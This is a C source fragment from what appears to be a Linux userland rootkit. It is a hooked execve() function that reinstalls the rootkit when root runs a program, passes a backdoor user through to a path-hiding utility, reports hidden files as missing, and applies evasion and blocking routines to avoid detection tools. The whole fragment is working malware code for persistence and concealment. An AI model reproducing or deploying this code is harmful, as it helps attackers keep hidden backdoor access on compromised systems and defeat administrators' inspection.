int execve(const char *filename, char *const argv[], char *const envp[]){
#ifdef DO_REINSTALL
    if(!not_user(0)) reinstall();
#endif

    hook(CEXECVE);

    if(is_bdusr()){
#ifdef HIDING_UTIL                                     /* running ./bdv from a backdoor shell  */
        if(!fnmatch("*/bdv", argv[0], FNM_PATHNAME))   /* allows you to hide & unhide paths on */
            do_hidingutil(argv);                       /* the fly.                             */
#endif
        return (long)call(CEXECVE, filename, argv, envp);
    }

    if(hidden_path(filename)){
        errno = ENOENT;
        return -1;
    }

#if defined(DO_REINSTALL) && defined(DO_EVASIONS)
    int evasion_status = evade(filename, argv, envp);
    switch(evasion_status){
        case VEVADE_DONE:
            exit(0);
        case VINVALID_PERM:
            errno = CANTEVADE_ERR;
            return -1;
        case VFORK_ERR:
            return -1;
        case VFORK_SUC:
            return (long)call(CEXECVE, filename, argv, envp);
        case VNOTHING_DONE:
            break;  /* ?? */
    }
#endif

#ifdef DO_EVASIONS
    if(block_strings(filename, argv)){
        errno = EPERM;
        return -1;
    }
#endif

    return (long)call(CEXECVE, filename, argv, envp);
}
